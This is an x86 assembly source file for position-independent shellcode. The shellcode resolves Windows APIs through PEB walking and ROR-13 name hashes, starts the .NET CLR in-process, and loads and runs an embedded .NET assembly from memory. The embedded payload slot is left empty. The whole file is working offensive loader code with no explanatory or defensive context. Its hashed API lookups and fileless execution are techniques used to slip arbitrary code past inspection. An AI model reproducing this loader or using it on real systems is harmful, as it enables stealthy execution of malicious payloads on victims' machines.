                        .586p
                        .model  flat, stdcall
                        option  casemap:none

include                 pe64.inc
                        
                        .code
                        assume  fs:nothing
ExportShellcode         proc    pdwSize:dword
                        mov     eax, pdwSize
                        mov     dword ptr[eax], shellcode_end - shellcode
                        mov     eax, offset shellcode
                        ret
ExportShellcode         endp
 
                        
shellcode:              ;jmp     $
                        call    __delta
__delta:                pop     ebp
                        
                        push    0EC0E4E8Eh              ;LoadLibraryA
                        call    get_api_mshash
                        mov     ebx, eax 
                        
                        lea     eax, [ebp+(szmscoree - __delta)]
                        push    eax
                        call    ebx
                        lea     eax, [ebp+(szoleaut32 - __delta)]
                        push    eax
                        call    ebx
                                                
                        push    0DA8DE904h
                        call    get_api_mshash          ;CorBindToRuntime
                        
                        lea     ecx, [ebp+(pCorRuntimeHost - __delta)]
                        push    ecx
                        lea     ecx, [ebp+(IID_CorRuntimeHost - __delta)]
                        push    ecx
                        lea     ecx, [ebp+(CLSID_CorRuntimeHost - __delta)]
                        push    ecx
                        push    0
                        lea     ecx, [ebp+(usnetver - __delta)]
                        push    ecx
                        call    eax
                        
                        mov     eax, [ebp+(pCorRuntimeHost - __delta)]
                        mov     ecx, [eax]
                        push    eax
                        call    dword ptr [ecx+28h]             ;pCorRuntimeHost->Start();
                                               
                        mov     eax, [ebp+(pCorRuntimeHost - __delta)]
                        mov     ecx, [eax]
                        lea     edx, [ebp+(pDefaultDomain - __delta)]
                        push    edx
                        push    eax
                        call    dword ptr[ecx+34h]              ;pCorRuntimeHost->GetDefaultDomain
                        
                        mov     eax, [ebp+(pDefaultDomain - __delta)]
                        mov     ecx, [eax]
                        lea     edx, [ebp+(pAppDomain - __delta)]
                        push    edx
                        lea     edx, [ebp+(IID_AppDomain - __delta)]
                        push    edx
                        push    eax
                        call    dword ptr[ecx]
                        
                        mov     eax, [ebp+(pAppDomain - __delta)]
                        mov     ecx, [eax]
                        
                        push    066DF3906h                      ;SafeArrayCreateVector
                        call    get_api_mshash
                        
                        push    dword ptr[ebp+(dotnetbytes_size - __delta)]
                        push    0
                        push    17                              ;VT_UI1
                        call    eax
                        mov     [ebp+(pRawAssembly - __delta)], eax
                        
                        push    09F266B8Eh                      ;SafeArrayAccessData
                        call    get_api_mshash
                        
                        lea     ecx, [ebp+(pbytes - __delta)]
                        push    ecx
                        push    [ebp+(pRawAssembly - __delta)]
                        call    eax
                        
                        mov     edi, [ebp+(pbytes - __delta)]
                        lea     esi, [ebp+(dotnetbytes - __delta)]
                        mov     ecx, [ebp+(dotnetbytes_size - __delta)]
                        cld
                        rep     movsb
                        
                        push    0AB2BF222h                      ;SafeArrayUnaccessData
                        call    get_api_mshash
                        push    [ebp+(pRawAssembly - __delta)]
                        call    eax
                        
                        mov     eax, [ebp+(pAppDomain - __delta)]
                        mov     ecx, [eax]
                        lea     edx, [ebp+(pAssembly - __delta)]
                        push    edx
                        push    dword ptr[ebp+(pRawAssembly - __delta)]
                        push    eax
                        call    dword ptr[ecx+0b4h]             ;pAppDomain->Load_3
                        
                        mov     eax, [ebp+(pAssembly - __delta)]
                        mov     ecx, [eax]
                        lea     edx, [ebp+(pMethod - __delta)]
                        push    edx
                        push    eax
                        call    dword ptr[ecx+40h]              ;pAssembly->get_EntryPoint
                                                
                        push    0
                        push    0
                        push    0                               ;
                        push    0                               ; empty VARIANT passed
                        push    0                               ; on stack...
                        push    0                               ;
                        mov     eax, [ebp+(pMethod - __delta)]
                        mov     ecx, [eax]
                        push    eax
                        call    dword ptr[ecx+94h]              ;pMethidInfo->Invoke_3
                        
                        push    0E11676C3h
                        call    get_api_mshash
                        
                        push    dword ptr[ebp+(pRawAssembly - __delta)]
                        call    eax
                        
                        mov     eax, [ebp+(pMethod - __delta)]
                        mov     ecx, [eax]
                        push    eax
                        call    dword ptr[ecx+8]
                        
                        mov     eax, [ebp+(pAssembly - __delta)]
                        mov     ecx, [eax]
                        push    eax
                        call    dword ptr[ecx+8]
                        
                        mov     eax, [ebp+(pAppDomain  - __delta)]
                        mov     ecx, [eax]
                        push    eax
                        call    dword ptr[ecx+8]
                        
                        mov     eax, [ebp+(pDefaultDomain  - __delta)]
                        mov     ecx, [eax]
                        push    eax
                        call    dword ptr[ecx+8]
                        
                        mov     eax, [ebp+(pCorRuntimeHost  - __delta)]
                        mov     ecx, [eax]
                        push    eax
                        call    dword ptr[ecx+8]
                        
                        ret
                        

get_api_mshash:         push    esi
                        push    ebx
                        push    edi
                        mov     ebx, [esp+10h]
                        mov     esi, dword ptr fs:[30h]	        
                        mov     esi, dword ptr [esi+0ch]        
                        lea     edi, dword ptr [esi+1ch]
                        mov     esi, dword ptr [esi+1ch]        

__loop_api1:            cmp     esi, edi
                        jz      __exit_gam
                        push    ebx
                        push    dword ptr[esi+08h]                                                 
                        call    getprocaddress
                        mov     esi, dword ptr[esi]
                        test    eax, eax
                        jz      __loop_api1
__exit_gam:
                        pop     edi
                        pop     ebx
                        pop     esi
                        ret     04

getprocaddress:
                        pushad
                        xor     eax, eax
                        mov     ebx, dword ptr[esp+24h]
                        test    ebx, ebx
                        jz      __exit0
                        mov     edi, dword ptr[ebx+3ch]
                        add     edi, ebx
                        mov     eax, [edi.peheader.pe_export]
                        test    eax, eax
                        jz      __exit0
                        xchg    edi, eax
                        add     edi, ebx
                        xor     ecx, ecx
                        mov     ebp, [edi.export_directory.ed_addressofnames]
                        add     ebp, ebx
__loop_names:           mov     esi, [ebp]
                        add     esi, ebx
                        xor     eax, eax
                        cdq
__hash_name:            lodsb
                        test    al, al
                        jz      __cmphash
                        ror     edx, 0dh
                        add     edx, eax
                        jmp     __hash_name
__cmphash:              cmp     edx, [esp+28h]
                        je      __getapi                        
                        add     ebp, 4
                        inc     ecx
                        cmp     ecx, [edi.export_directory.ed_numberofnames]
                        jne     __loop_names
                        xor     eax, eax
                        jmp     __exit0                 
__getapi:               mov     esi, [edi.export_directory.ed_addressofordinals]
                        add     esi, ebx
                        movzx   esi, word ptr[esi+ecx*2]
                        mov     eax, [edi.export_directory.ed_addressoffunctions]
                        add     eax, ebx
                        mov     eax, [eax+esi*4]
                        add     eax, ebx
__exit0:
                        mov     [esp+1ch], eax       
                        popad
                        ret     8

pCorRuntimeHost         dd      ?
pAppDomain              dd      ?
pDefaultDomain          dd      ?
pAssembly               dd      ?
pMethod                 dd      ?
szmscoree               db      "mscoree.dll", 0
szoleaut32              db      "oleaut32.dll", 0
usnetver                dw      'v', '4', '.', '0', '.', '3', '0', '3', '1', '9', 0
pRawAssembly            dd      ?
pbytes                  dd      ?


index                   dd      ?

CLSID_CorRuntimeHost    dd 0CB2F6723h           
                        dd 11D2AB3Ah
                        dd 0C000409Ch
                        dd 3E0AA34Fh

IID_CorRuntimeHost      dd 0CB2F6722h          
                        dd 11D2AB3Ah
                        dd 0C000409Ch
                        dd 3E0AA34Fh

IID_AppDomain           dd 5F696DCh             
                        dd 36632B29h
                        dd 38C48BADh
                        dd 13A7F29Ch

shellcode_end:
                        
dotnetbytes_size        dd      dotnetbytes_end - dotnetbytes
dotnetbytes:                        
dotnetbytes_end:
                        end                        
                        
                        
                        
                        